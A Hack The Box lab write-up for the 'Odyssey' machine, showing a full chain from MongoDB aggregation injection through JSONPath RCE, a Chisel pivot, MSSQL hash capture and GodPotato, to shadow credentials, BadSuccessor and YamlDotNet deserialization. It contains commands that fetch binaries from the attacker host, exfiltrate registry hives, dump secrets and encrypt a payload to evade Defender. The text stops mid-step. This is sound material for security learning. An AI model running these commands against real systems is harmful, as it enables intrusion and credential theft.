# HTB Odyssey

## Summary

Odyssey starts with a web application on TCP/3000. Its MDS search endpoint passes an attacker-controlled aggregation pipeline to MongoDB. That gives access to server-side JavaScript and, through a MongoDB module-loader flaw, files on the web host. A pending invite and a WebAuthn account-binding mistake provide an Administrator session. From there, the template renderer reads its own configuration and exposes a diagnostic route that runs commands as `webadmin`.

The rest of the box crosses two internal machines. A SQL audit login leads to the SQL Server service account and then SYSTEM on the database host. Its machine-account credentials have a path to `svc-aegis-build` in Active Directory; BadSuccessor grants `svc-aegis-deploy`. That account can read AegisStream's viewer material on the domain controller. A viewer diagnostic exposes the wrapping key needed to decrypt the operator key. An unsafe YAML import then executes as the stream service, whose token privilege gives SYSTEM for `root.txt`.

| Stage | Result |
| --- | --- |
| MDS search and MongoDB | File disclosure and access to pending invites |
| WebAuthn and renderer | Administrator session, then renderer file read |
| Diagnostic JSONPath | Command execution as `webadmin`; pivot to SQL Server |
| SQL Server | `svc-mssql`, SYSTEM, and `user.txt` |
| Active Directory | `ODYSSEY-DB$` → `svc-aegis-build` → `svc-aegis-deploy` |
| AegisStream | Operator key, service execution, SYSTEM, and `root.txt` |

The recorded lab used `10.129.104.203` for the public target and `10.10.15.156` for the attacker VPN address. The internal hosts were `172.16.0.12` (web), `172.16.0.11` (SQL Server), and `172.16.0.10` (domain controller). Addresses and invite tokens can change after a box reset.

Run the commands from the `Odyssey` directory in this repository. The paths use `scripts/`, `artifacts/`, `scans/`, `responses/`, and `smb-share/` directly under that directory. The custom helper scripts and source payloads are included; generated binaries and per-run output are not. See [REPRODUCTION.md](REPRODUCTION.md) for prerequisites and runtime values.

## Enumeration

### TCP scan and web service

I started with a full TCP SYN scan. The output directories are already present in this bundle:

```bash
nmap -sS -Pn -n -p- -T4 \
  --min-rate 1000 --max-rate 1500 --max-retries 2 \
  --stats-every 15s --reason \
  -oA scans/tcp-full-adaptive \
  10.129.104.203
```

```text
Nmap scan report for 10.129.104.203
Host is up, received user-set (0.11s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON
3000/tcp open  ppp     syn-ack ttl 127
```

Only TCP/3000 answered. `ppp` is Nmap's name for that port when it has not probed the service; it does not mean the host runs PPP. A targeted service probe is the next step if repeating the enumeration:

```bash
nmap -sV -Pn -n -p 3000 --reason \
  -oA scans/tcp-3000-service 10.129.104.203
```

The existing web enumeration identified Node.js Express over HTTP. The application was reached at `http://aegis.korvia.htb:3000/`; map `aegis.korvia.htb` to the current target IP if local name resolution does not already do so:

```bash
printf '10.129.104.203 aegis.korvia.htb\n' >> /etc/hosts
```

The unauthenticated JavaScript exposed a username-less WebAuthn flow and an MDS compatibility ticker, drawing attention to the MDS API:

```bash
curl -sS http://aegis.korvia.htb:3000/js/main.js |
  grep -nE 'compatibility ticker|aegis-mds/search'

curl -sS http://aegis.korvia.htb:3000/js/webauthn.js |
  grep -nE '/api/v1/auth/webauthn/(register|auth)/(begin|finish)'

curl -sS \
  -H 'Content-Type: application/json' \
  -d '{}' \
  http://aegis.korvia.htb:3000/api/v1/auth/webauthn/auth/begin |
  jq '{allowCredentials, userVerification}'
```
Condensed output:
```
FIDO authenticator compatibility ticker
/api/v1/aegis-mds/search?q=&limit=8

/api/v1/auth/webauthn/register/begin
/api/v1/auth/webauthn/register/finish
/api/v1/auth/webauthn/auth/begin
/api/v1/auth/webauthn/auth/finish

{
  "allowCredentials": [],
  "userVerification": "preferred"
}
```
The empty allowCredentials list is consistent with username-less authentication using discoverable credentials. The exact registration policy, residentKey: "required", was confirmed later from the recovered server-side WebAuthn handler.

### Confirmed aggregation injection

The MDS search API accepts a JSON aggregation pipeline from the `pipeline` query parameter. I compared an empty pipeline with a match that should return rows, a match that should return none, and a one-row limit. The changing row counts showed that MongoDB was executing the supplied stages. The filter rejected a top-level `$lookup`, but accepted that same operation inside an allowed `$facet`.

Reproduction:

```bash
./scripts/probe-mds-pipeline.sh
```

The helper issues URL-encoded requests equivalent to:

```bash
curl -sS -G \
  --data-urlencode 'pipeline=[{"$match":{"vendor":"Yubico"}}]' \
  http://aegis.korvia.htb:3000/api/v1/aegis-mds/search
```

The counts were:

```text
empty       status=200 count=52
match_hit   status=200 count=4
match_miss  status=200 count=0
limit_one   status=200 count=1
```

### MongoDB JavaScript and file disclosure

The accepted `$project` stage also allowed `$function`, so the public Express endpoint could execute JavaScript inside MongoDB's embedded JavaScript engine. This was MongoDB JavaScript—not Node.js—and globals such as Node's `require` were initially unavailable.

I first queried the runtime and tested the module loader against `/etc/hostname`:

```bash
./scripts/probe-mds-buildinfo.sh
./scripts/mongodb-module-read.sh hostname /etc/hostname
```

Condensed output:

```text
status=200
version=7.0.32
buildEnvironment.target_os=linux
ReferenceError: odyssey is not defined
```

MongoDB `7.0.32` is covered by the [MongoDB module-loader file-disclosure advisory](https://www.mongodb.com/resources/products/alerts) for CVE-2026-13078. The vulnerability normally requires access to MongoDB, but the application exposed the necessary aggregation operations over HTTP.

The hostname file contained the token `odyssey`. When the module loader read and interpreted that file as JavaScript, it treated `odyssey` as an undefined variable and returned it in a `ReferenceError`. This established an error-based file oracle rather than a general raw-file download primitive.

The loader also produced distinguishable results for different path types:

```text
Missing path:          can't open for reading ...
Existing directory:    Directory import ... is not supported
Existing CommonJS:     require is not defined
```

Testing candidate paths confirmed that `/home/webadmin` and `/home/webadmin/aegis` existed:

```bash
./scripts/probe-directory-candidates.sh
```

Relevant output:

```text
/home/webadmin        Error: Directory import '/home/webadmin' is not supported
/home/webadmin/aegis  Error: Directory import '/home/webadmin/aegis' is not supported
```

Conventional Node.js module paths beneath that application directory were then tested. Existing CommonJS files reached their first Node-specific `require()` call before failing, confirming that MongoDB had read them.

To inspect those modules beyond the initial failure, the CommonJS tracer supplied inert Proxy-based replacements for `require`, `module`, `process.env`, and external dependencies. The proxies recorded module imports, environment-variable access, route registrations, exported functions, and function arguments without establishing real MongoDB or SQL connections:

```bash
./scripts/trace-commonjs-module.sh \
  mongo /home/webadmin/aegis/db/mongo.js

./scripts/trace-commonjs-module.sh \
  webauthn /home/webadmin/aegis/routes/webauthn.js

./scripts/trace-commonjs-module.sh \
  sql /home/webadmin/aegis/db/sql.js
```

The MongoDB trace exposed the local `aegis_mds` configuration, while the WebAuthn trace recovered the registration and authentication handlers used later. In `db/sql.js`, the tracer recorded the configuration passed to its mocked `mssql.connect()` call.

The SQL values can be extracted from the saved trace with:

```bash
jq -r '
  .[0].probe as $p |
  ($p.trace[] |
    select(.op == "call" and .path == "require(mssql).connect") |
    .args[0] | fromjson) as $c |
  "application root=\($p.path | sub("/db/sql\\.js$"; ""))",
  "SQL host=\($c.server)",
  "SQL database=\($c.database)",
  "SQL username=\($c.user)",
  "SQL password=\($c.password)"
' responses/cjs-trace-sql.body
```

Output:

```text
application root=/home/webadmin/aegis
SQL host=172.16.0.11
SQL database=aegis
SQL username=odyssey_app
SQL password=opc0932k90%%lODFI93-++
```

Because the tracer's `process.env` replacement returned no values, these are fallback settings embedded in the module source; they are not, by themselves, proof that the live Express process had no environment-variable overrides. The trace nevertheless disclosed the internal SQL host and the application's default connection details.

## Foothold: WebAuthn Administrator session

The recovered WebAuthn route showed that enrollment needed an active invite. With `$lookup` nested under `$facet`, the MDS endpoint could read the `pending_invites` collection:

```bash
curl --connect-timeout 5 --max-time 15 -sS -G \
  -o responses/pending-invites.body \
  --data-urlencode 'pipeline=[{"$limit":1},{"$facet":{"invites":[{"$lookup":{"from":"pending_invites","pipeline":[{"$match":{"redeemed":false}},{"$limit":10}],"as":"rows"}},{"$project":{"_id":0,"rows":1}}]}}]' \
  http://aegis.korvia.htb:3000/api/v1/aegis-mds/search
```

The response contained unused invite tokens. This run selected the second returned row; inspect `responses/pending-invites.body` before choosing a token on a fresh instance, since row order is not guaranteed. The virtual-authenticator helper registered a CTAP2 resident credential and produced a valid signed assertion. Changing the independently trusted `response.userHandle` made the login finish handler attribute the assertion to `admin`:

```bash
jq -r '.[0].invites[0].rows[1].token' \
  responses/pending-invites.body | \
  ./scripts/webauthn-impersonate.py | \
  tee responses/webauthn-admin.json

export AEGIS_COOKIE
AEGIS_COOKIE=$(jq -r '.cookie_header' responses/webauthn-admin.json)
```

The resulting session identified itself as:

```json
{
  "handle": "admin",
  "display_name": "System Administrator",
  "role": "Administrator",
  "clearance": "Δ-5",
  "redirect": "/dashboard"
}
```

With Administrator access, template rendering became available. A user-supplied `overrides.__proto__` object was merged into the Nunjucks configuration, setting `allowRawBlocks` on the shared prototype. Pandoc then passed raw LaTeX to TeX, whose `\openin` and `\read` diagnostics came back in the rendering response.

That file read occurred in the isolated `aegis-render` process on `odyssey-web`. It disclosed configuration and internal MSSQL credentials; command execution came later through a separate diagnostic route.

The successful hostname control and environment read were:

```bash
./scripts/render-template-probe.sh prototype-hostname \
  @artifacts/prototype-raw-hostname.md \
  '{"__proto__":{"allowRawBlocks":true}}'

./scripts/render-template-probe.sh render-env \
  @artifacts/prototype-read-render-env.md \
  '{"__proto__":{"allowRawBlocks":true}}'
```

The hostname test and environment read produced diagnostics of this form:

```text
stage=nunjucks code=0
stage=pandoc code=0
stage=pdflatex code=1
AEGIS-LEAK:odyssey-web
AEGIS-HIT:/etc/aegis-render.env
```

## From renderer file read to `webadmin`

The renderer could read more than its own environment. I used it to inspect the MDS diagnostic configuration, its route implementation, and the installed `jsonpath-plus` package:

```bash
./scripts/render-template-probe.sh mds-diag-env \
  @artifacts/prototype-read-mds-diag-env.md \
  '{"__proto__":{"allowRawBlocks":true}}'

./scripts/render-template-probe.sh mds-diag-source-v2 \
  @artifacts/prototype-read-mds-diag-source.md \
  '{"__proto__":{"allowRawBlocks":true}}'

./scripts/render-template-probe.sh jsonpath-package \
  @artifacts/prototype-read-jsonpath-package.md \
  '{"__proto__":{"allowRawBlocks":true}}'
```

The useful pieces were:

```text
MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
route=/api/v1/aegis-mds/_diag/:token/jpquery
jsonpath-plus=10.2.0
```

The hidden route accepted a JSONPath beginning with `$` and passed it to `jsonpath-plus` `10.2.0`. That version is affected by [CVE-2025-1302](https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-8719585). The saved helper submitted the payload to the route using the recovered diagnostic token:

```bash
./scripts/jpquery.sh rce-id registration \
  @artifacts/jsonpath-rce-id.txt
```

The command ran as `webadmin`:

```text
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),27(sudo),1001(aegis-render)
```

The web host was `172.16.0.12/24`, while the SQL Server lived at `172.16.0.11`. A reverse Chisel SOCKS tunnel made the internal address reachable from Kali. With a compatible `chisel` binary at `/usr/bin/chisel`, run the server and an HTTP file server in separate Kali terminals:

```bash
/usr/bin/chisel server --reverse --port 8001 --host 10.10.15.156
```

```bash
mkdir -p /tmp/odyssey-chisel
cp /usr/bin/chisel /tmp/odyssey-chisel/chisel
python3 -m http.server 8000 --directory /tmp/odyssey-chisel --bind 10.10.15.156
```

Set the ProxyChains SOCKS entry to `socks5 127.0.0.1 1080`. Then stage and launch the client from the web host and check the SQL port:

```bash
./scripts/jpquery-rce.sh stage-chisel \
  '/usr/bin/curl -fsS http://10.10.15.156:8000/chisel -o /tmp/.aegis-chisel && chmod 700 /tmp/.aegis-chisel && sha256sum /tmp/.aegis-chisel'

./scripts/jpquery-rce.sh start-chisel-v2 \
  '(/tmp/.aegis-chisel client http://10.10.15.156:8001 R:socks >/tmp/.aegis-chisel.log 2>&1 </dev/null)& true'

proxychains4 -q nmap -n -Pn -sT -p1433 --reason \
  --max-retries 1 --host-timeout 20s 172.16.0.11
```

The reverse SOCKS proxy listened on Kali's `127.0.0.1:1080`. Nmap uses `-sT` here because a TCP connect scan works through the proxy.

## SQL Server: from audit login to SYSTEM

The renderer environment exposed a second SQL connection string, this time for the audit database:

```text
server=172.16.0.11
database=aegis_audit
username=aegis_audit_publisher
password=Rxd!Qw6n8sP..2bJ@Wpx-2026
```

This stage followed the chain:

```text
aegis_audit_publisher
        │
        ├── bulkadmin → OPENROWSET(BULK...)
        │
        └── UNC read → NetNTLMv2 for svc-mssql
                            │
                            └── password cracking
                                      │
                                      ▼
                          svc-mssql → SQL sysadmin
                                      │
                                      └── xp_cmdshell
                                              │
                                              └── SeImpersonatePrivilege
                                                        │
                                                        ▼
                                                   SQL CLR
                                                        │
                                                        ▼
                                                      SYSTEM
```

### Enumerating the audit login

The SQL host was reachable through the Chisel SOCKS pivot. The `mssql-audit.sh` wrapper connects through ProxyChains and either extracts the credential from the saved renderer response or reads the `AEGIS_RENDER_DB_*` environment variables documented in [REPRODUCTION.md](REPRODUCTION.md).

I used it to enumerate the SQL Server version, login roles, database roles, and security-sensitive configuration:

```bash
./scripts/mssql-audit.sh \
  -file artifacts/mssql-audit-enum.sql
```

Relevant results:

```text
Microsoft SQL Server 2022 RTM (16.0.1000)
login=aegis_audit_publisher
database=aegis_audit
server_role=bulkadmin
database_role=db_owner
xp_cmdshell=0
clr enabled=0
show advanced options=0
```

The account did not initially have command execution:

- `db_owner` applied to the `aegis_audit` database.
- `bulkadmin` permitted server-side bulk-file operations.
- `xp_cmdshell` and SQL CLR were disabled.

The useful permission was `bulkadmin`. SQL Server performs `OPENROWSET(BULK...)` file operations through the SQL Server process, not through the remote SQL client. The following controls read a local Windows file and the SQL Server error logs:

```bash
./scripts/mssql-audit.sh \
  -file artifacts/mssql-bulk-controls.sql

./scripts/mssql-audit.sh \
  -file artifacts/mssql-errorlog-archives.sql
```

The successful local read confirmed that bulk operations ran in the SQL service context. A rotated startup log identified the Windows account running that service:

```text
ODYSSEY\svc-mssql
```

This established two distinct identities:

```text
aegis_audit_publisher   SQL-authenticated audit login
ODYSSEY\svc-mssql       Windows account running SQL Server
```

### Capturing the SQL service account's authentication

`OPENROWSET(BULK...)` also accepts UNC paths. When SQL Server attempts to open a path such as:

```text
\\10.10.15.156\share\probe.txt
```

Windows first authenticates to the remote SMB server. Because the original connection used SQL authentication, the outbound SMB request was made as the SQL Server service account, `ODYSSEY\svc-mssql`.

The included `artifacts/mssql-unc-auth.sql` contains:

```sql
SELECT BulkColumn
FROM OPENROWSET(
  BULK '\\10.10.15.156\share\probe.txt',
  SINGLE_CLOB
) AS file_data;
```

If the current `tun0` address is different, update the IP in that SQL file before continuing.

Start Responder on the attacker VPN interface:

```bash
responder -I tun0 -v
```

In another terminal, trigger the UNC access:

```bash
./scripts/mssql-audit.sh \
  -file artifacts/mssql-unc-auth.sql
```

The remote file did not need to exist. The SMB authentication occurred before Windows could determine whether `probe.txt` was available. Responder captured a NetNTLMv2 challenge-response for `svc-mssql`.

A NetNTLMv2 response is neither the plaintext password nor a reusable NT hash. It can, however, be used to test password candidates offline. Save the captured line as:

```text
responses/svc-mssql.netntlmv2
```

Responder normally also writes captured responses under `/usr/share/responder/logs/`. The relevant line can be copied with:

```bash
rg --no-filename -i 'svc-mssql' \
  /usr/share/responder/logs/SMB-NTLMv2-*.txt |
  tail -n 1 > responses/svc-mssql.netntlmv2
```

Hashcat mode `5600` performs the offline password check:

```bash
hashcat -m 5600 -a 0 -O \
  --session odyssey-svc-mssql \
  --potfile-path responses/hashcat-odyssey.pot \
  --outfile responses/svc-mssql.cracked \
  --outfile-format 2 \
  responses/svc-mssql.netntlmv2 \
  /usr/share/wordlists/rockyou.txt
```

Hashcat recovered the service-account password:

```text
svc-mssql:cml958782
```

The account name is shown above for clarity. Because `--outfile-format 2` was used, `responses/svc-mssql.cracked` contains only the password, which is the format expected by `mssql-svc.sh`.

### Reconnecting as `svc-mssql`

The recovered password allowed Windows-integrated SQL authentication as the domain service account:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-svc-enum.sql
```

The account was mapped to SQL Server's `sysadmin` role:

```text
SYSTEM_USER=ODYSSEY\svc-mssql
IS_SRVROLEMEMBER('sysadmin')=1
```

A SQL `sysadmin` can change server-level configuration. The next query enabled advanced options and `xp_cmdshell`, then ran `whoami /priv` to inspect the Windows token assigned to commands launched by SQL Server:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-enable-command-enum.sql
```

The important result was:

```text
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

For a `sysadmin`, `xp_cmdshell` executes in the SQL Server service context. SQL administrative access had therefore become operating-system command execution as `ODYSSEY\svc-mssql`, with `SeImpersonatePrivilege` enabled.

### SQL CLR and `user.txt`

Initial attempts to run a standalone token helper were blocked by Defender. Instead, the same token-impersonation logic was compiled into a SQL CLR assembly.

`build-token-helper.sh` retrieves the pinned GodPotato source revision and builds:

```text
artifacts/AuditWorker.exe
artifacts/AuditWorkerSql.dll
```

The DLL includes `SqlEntry.cs`, which exposes the helper through a SQL stored procedure and returns its console output to the SQL client.

Build and register the assembly:

```bash
./scripts/build-token-helper.sh
./scripts/load-auditworker-clr.sh
```

Because `svc-mssql` was a SQL `sysadmin`, the loader could:

1. Enable SQL CLR.
2. Register the assembly's SHA-512 hash as trusted.
3. Create it with `PERMISSION_SET=UNSAFE`.
4. Expose it as the `dbo.audit_token_exec` stored procedure.

The DLL bytes were submitted through SQL rather than written as a DLL on the target filesystem. When invoked, the managed code ran inside the SQL Server process and inherited its enabled `SeImpersonatePrivilege`.

Test the procedure:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-auditworker-clr-proof.sql
```

GodPotato used `SeImpersonatePrivilege` to trigger RPCSS authentication to a controlled named pipe. The initial `NETWORK SERVICE` identity shown below was the intermediate named-pipe client obtained during that RPC stage. The helper then located and duplicated a usable SYSTEM token:

```text
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] PID : 468 Token:0x776 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
nt authority\system
```

The identities in this transition were therefore:

```text
ODYSSEY\svc-mssql      SQL login and SQL service context
NETWORK SERVICE        Intermediate RPC impersonation identity
NT AUTHORITY\SYSTEM    Final duplicated token
```

With SYSTEM execution confirmed, the stored procedure could read the local Administrator desktop. The query in `artifacts/mssql-system-user-proof.sql` was:

```sql
EXEC dbo.audit_token_exec N'cmd.exe /c "echo USER_FLAG & type C:\Users\Administrator\Desktop\user.txt & echo LOCAL_ADMIN_DESKTOP & dir /a /b C:\Users\Administrator\Desktop & echo DOMAIN_ADMIN_DESKTOP & dir /a /b C:\Users\Administrator.ODYSSEY\Desktop"'
```

Execute it through the service-account SQL session:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-system-user-proof.sql
```

Result:

```text
[*] CurrentUser: NT AUTHORITY\SYSTEM
USER_FLAG
[USER FLAG OMITTED]
LOCAL_ADMIN_DESKTOP
desktop.ini
user.txt
```

### Recovering the database-host machine identity

SYSTEM access allowed the protected `SYSTEM`, `SECURITY`, and `SAM` registry hives to be saved. The `SYSTEM` hive contains the boot key needed to decrypt secrets stored in the other hives, while the `SECURITY` hive contains LSA secrets associated with the domain-joined machine.

The export script copies the hives to an authenticated SMB share. Stop Responder before starting this server because both tools need to bind TCP port 445.

Start the temporary SMB share in a separate attacker terminal:

```bash
impacket-smbserver -smb2support \
  -username exfil \
  -password 'Exfil-2026-Temp!' \
  share "$PWD/smb-share"
```

The export script contains the recorded attacker VPN address. Update `10.10.15.156` in `artifacts/mssql-system-export-hives.sql` if the current `tun0` address is different.

Run the export:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-system-export-hives.sql
```

Process the downloaded hives locally:

```bash
impacket-secretsdump \
  -system smb-share/od_sys.hiv \
  -security smb-share/od_sec.hiv \
  -sam smb-share/od_sam.hiv LOCAL |
  tee responses/odyssey-db-secrets.txt
```

Among the recovered LSA secrets were the domain credentials for the database host's machine account:

```text
ODYSSEY\ODYSSEY-DB$:aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d:::
ODYSSEY-DB$ AES256: aaff0ce627d9bb964d1ab0bf189a3956673c4ab2dbdc2768766a90708e1d242c
ODYSSEY-DB$ AES128: bde72605dccc9c3dc31b4b697a3fbb9d
```

A domain machine account is an Active Directory security principal. Its NT hash or Kerberos keys can therefore be used to authenticate to domain services as `ODYSSEY-DB$`.

Internal enumeration identified the domain controller at `172.16.0.10`. The `bloody-machine.sh` wrapper extracts the machine NT hash from `responses/odyssey-db-secrets.txt` and uses it to query Active Directory through the SOCKS proxy:

```bash
./scripts/bloody-machine.sh \
  get membership 'ODYSSEY-DB$'

./scripts/bloody-machine.sh \
  get writable --detail --partition DOMAIN --exclude-del
```

The effective-rights analysis found this nested group path:

```text
ODYSSEY-DB$
  └── Build Hosts
      └── Pipeline Trustees
          └── Attest Key Managers
```

Through that membership chain, the machine account could modify a specific attribute on the build-service account:

```text
CN=svc-aegis-build,OU=Pipeline,DC=odyssey,DC=htb
msDS-KeyCredentialLink: WRITE
```

Write access to `msDS-KeyCredentialLink` enables the shadow-credential transition used in the next stage.

## Active Directory: machine account to deploy account

### Shadow credentials on `svc-aegis-build`

`ODYSSEY-DB$` could write `msDS-KeyCredentialLink` on `svc-aegis-build`. Adding a shadow credential gave a PKINIT ticket for that service account:

```bash
./scripts/bloody-machine.sh add shadowCredentials \
  svc-aegis-build --path responses/svc-aegis-build

KRB5CCNAME=responses/svc-aegis-build.ccache klist
```

The attempt to extract an NT hash returned `KDC_ERR_ETYPE_NOTSUPP`, but a valid TGT was saved in `responses/svc-aegis-build.ccache`. The cache check showed:

```text
Default principal: svc-aegis-build@ODYSSEY.HTB
Valid starting: 11/16/26 12:16:55
Expires:        11/16/26 22:16:55
Service:        krbtgt/ODYSSEY.HTB@ODYSSEY.HTB
```

With that ticket, I enumerated what the new identity could change in the domain:

```bash
KRB5CCNAME=responses/svc-aegis-build.ccache \
proxychains4 -q bloodyAD -s \
  -d odyssey.htb -u svc-aegis-build \
  -k ccache=responses/svc-aegis-build.ccache kdc=172.16.0.10 \
  -H dc01.odyssey.htb -i 172.16.0.10 \
  get writable --detail --partition DOMAIN --exclude-del
```

It could create a delegated managed service account in `OU=Migrations` and write the superseded-account attributes on `svc-aegis-deploy`. Those rights were enough for the BadSuccessor path:

```text
distinguishedName: OU=Migrations,DC=odyssey,DC=htb
msDS-DelegatedManagedServiceAccount: CREATE_CHILD

distinguishedName: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
msDS-SupersededManagedAccountLink: WRITE
msDS-SupersededServiceAccountState: WRITE
```

### BadSuccessor to `svc-aegis-deploy`

The command created a dMSA called `aegis-migrate$` and pointed it at `svc-aegis-deploy` as its predecessor:

```bash
KRB5CCNAME=responses/svc-aegis-build.ccache \
proxychains4 -q bloodyAD -s \
  -d odyssey.htb -u svc-aegis-build \
  -k ccache=responses/svc-aegis-build.ccache kdc=172.16.0.10 \
  -H dc01.odyssey.htb -i 172.16.0.10 \
  add badSuccessor aegis-migrate \
  -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' \
  --ou 'OU=Migrations,DC=odyssey,DC=htb' | \
  tee responses/badsuccessor.txt
```

The tool returned a dMSA ticket and predecessor key:

```text
[+] Creating DMSA aegis-migrate$ in OU=Migrations,DC=odyssey,DC=htb
[+] Impersonating: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
[+] dMSA TGT stored in ccache file aegis-migrate_Jk.ccache
dMSA previous keys found in TGS:
RC4: 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```

The wrappers can parse `responses/badsuccessor.txt`. Exporting the same value also makes it available to the interactive client used below:

```bash
export DEPLOY_NT_HASH
DEPLOY_NT_HASH=$(
  sed -n '/dMSA previous keys found/,/^[[:space:]]*$/ {
    s/^RC4: \([0-9a-fA-F]\{32\}\)$/\1/p
  }' responses/badsuccessor.txt | head -n 1
)
```

I checked the recovered predecessor identity against the domain controller:

```bash
./scripts/domain-deploy.sh smb 172.16.0.10
./scripts/domain-deploy.sh ldap 172.16.0.10
./scripts/domain-deploy.sh winrm 172.16.0.10
```

The WinRM check showed access as `svc-aegis-deploy`:

```text
WINRM 172.16.0.10 5985 DC01 [+] odyssey.htb\svc-aegis-deploy (...) (Pwn3d!)
```

## AegisStream: viewer to operator

`svc-aegis-deploy` belonged to `Remote Management Users` and `AegisStream-Viewers`. The stream installation on the domain controller had files readable by that group:

```bash
./scripts/domain-deploy.sh winrm 172.16.0.10 -x \
  'cmd.exe /c "echo FILES & dir /a /s C:\ProgramData\AegisStream & echo ACLS & icacls C:\ProgramData\AegisStream /t /c"'
```

The ACL and file listing pointed to:

```text
C:\ProgramData\AegisStream\keys\viewer.key               Viewers:(R)
C:\ProgramData\AegisStream\keys\operator.key.enc        Viewers:(RX)
C:\ProgramData\AegisStream\dpapi\operator.wrap.bin      Viewers:(RX)
C:\Program Files\Aegis Stream Collector\AegisStreamSvc.dll
C:\Program Files\Aegis Stream Collector\YamlDotNet.dll
```

Connect as the deploy account:

```bash
proxychains4 -q evil-winrm \
  -i 172.16.0.10 \
  -u svc-aegis-deploy \
  -H "$DEPLOY_NT_HASH"
```

The following `download` lines are **Evil-WinRM client commands**, entered after connecting as `svc-aegis-deploy`. They are not PowerShell commands. I copied the accessible keys and assemblies, then decompiled the .NET code on Kali:

```text
download 'C:\ProgramData\AegisStream\keys\viewer.key' 'artifacts/aegisstream/viewer.key'
download 'C:\ProgramData\AegisStream\keys\operator.key.enc' 'artifacts/aegisstream/operator.key.enc'
download 'C:\ProgramData\AegisStream\dpapi\operator.wrap.bin' 'artifacts/aegisstream/operator.wrap.bin'
download 'C:\Program Files\Aegis Stream Collector\AegisStream.Common.dll' 'artifacts/aegisstream/AegisStream.Common.dll'
download 'C:\Program Files\Aegis Stream Collector\AegisStreamSvc.dll' 'artifacts/aegisstream/AegisStreamSvc.dll'
download 'C:\Program Files\Aegis Stream Collector\YamlDotNet.dll' 'artifacts/aegisstream/YamlDotNet.dll'
```

```bash
ilspycmd -p -o /tmp/odyssey-ilspy/common \
  artifacts/aegisstream/AegisStream.Common.dll
ilspycmd -p -o /tmp/odyssey-ilspy/svc \
  artifacts/aegisstream/AegisStreamSvc.dll
```

The service authenticates requests with HMAC-SHA256 over `UTF8(opcode) || payload`. Its viewer diagnostic invokes:

```csharp
byte[] body = ProtectedData.Unprotect(frame.Payload, null, DataProtectionScope.CurrentUser);
```

The operator key loader also unprotects `operator.wrap.bin`, then uses that 32-byte result as an AES key to decrypt `operator.key.enc`. Because the viewer diagnostic unprotects a supplied blob in the same service context, it can recover the wrapping key used for the operator credential.

The saved named-pipe client was compiled locally, then copied to the domain controller for the next request:

```bash
mcs -optimize+ \
  -out:artifacts/AegisStreamClient.exe \
  artifacts/AegisStreamClient.cs
```

In Evil-WinRM:

```text
upload artifacts/AegisStreamClient.exe AegisStreamClient.exe
```

From a Windows shell on the domain controller, the viewer-signed request used one line:

```powershell
.\AegisStreamClient.exe request 'C:\ProgramData\AegisStream\keys\viewer.key' DIAG_DECRYPT_TELEMETRY_BLOB 'C:\ProgramData\AegisStream\dpapi\operator.wrap.bin' 'C:\Users\svc-aegis-deploy\Documents\operator.wrap.key'
```

Output:

```text
status=OK bytes=32
```

After downloading the new `operator.wrap.key` to `artifacts/aegisstream/`, the local AES-GCM helper decrypted the operator HMAC key:

```bash
./scripts/decrypt-aegis-operator.py \
  artifacts/aegisstream/operator.wrap.key \
  artifacts/aegisstream/operator.key.enc \
  artifacts/aegisstream/operator.key
```

```text
decrypted operator key: 32 bytes
```

The recovered key was then copied back to the Windows host. In Evil-WinRM:

```text
download 'C:\Users\svc-aegis-deploy\Documents\operator.wrap.key' 'artifacts/aegisstream/operator.wrap.key'
upload artifacts/aegisstream/operator.key operator.key
```

An operator-signed export succeeded:

```powershell
.\AegisStreamClient.exe request '.\operator.key' CONFIG_EXPORT - '.\config-export.yml'
```

```text
status=OK bytes=125
```

### YAML import as `svc-aegis-stream`

Decompilation of the operator-only import showed a YamlDotNet deserializer that trusted type names from the input:

```csharp
new DeserializerBuilder()
    .WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())
    .Build()
    .Deserialize<object>(new StringReader(input));
```

The included `artifacts/aegisstream/proof.yml` instantiated `System.Windows.Data.ObjectDataProvider`, which invoked `Process.Start` during deserialization. Upload it from Evil-WinRM:

```text
upload artifacts/aegisstream/proof.yml proof.yml
```

The import provided a service-identity proof:

```powershell
.\AegisStreamClient.exe request '.\operator.key' CONFIG_IMPORT '.\proof.yml' '.\proof-response.bin'
cmd /c type C:\ProgramData\AegisStream\logs\yaml-proof.txt
```

```text
status=OK bytes=0
odyssey\svc-aegis-stream
```

The stream service token had high integrity and `SeImpersonatePrivilege`:

```text
User Name: odyssey\svc-aegis-stream
Mandatory Label\High Mandatory Level
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

### SYSTEM and `root.txt`

For SYSTEM access, I reused the token helper through `StreamRunner.cs`. These commands built the runner and prepared the helper for the Windows host:

```bash
mcs -optimize+ -out:artifacts/StreamRunner.exe \
  artifacts/StreamRunner.cs

openssl enc -aes-256-cbc \
  -K 319a77c205648dee4b13992a7f40bd18d1560cab8329f4687235e09d14ca5bf1 \
  -iv 6d28a104bb739e510fc83692e7451adc \
  -in artifacts/AuditWorker.exe \
  -out artifacts/AuditWorker.enc
```

Upload the generated files and included jobs from Evil-WinRM, then grant the stream service access to the two staging files:

```text
upload artifacts/StreamRunner.exe StreamRunner.exe
upload artifacts/AuditWorker.enc AuditWorker.enc
upload artifacts/aegisstream/system-debug.yml system-debug.yml
upload artifacts/aegisstream/root-action.yml root-action.yml
```

```cmd
icacls C:\Users\svc-aegis-deploy\Documents\StreamRunner.exe /grant "ODYSSEY\svc-aegis-stream:RX"
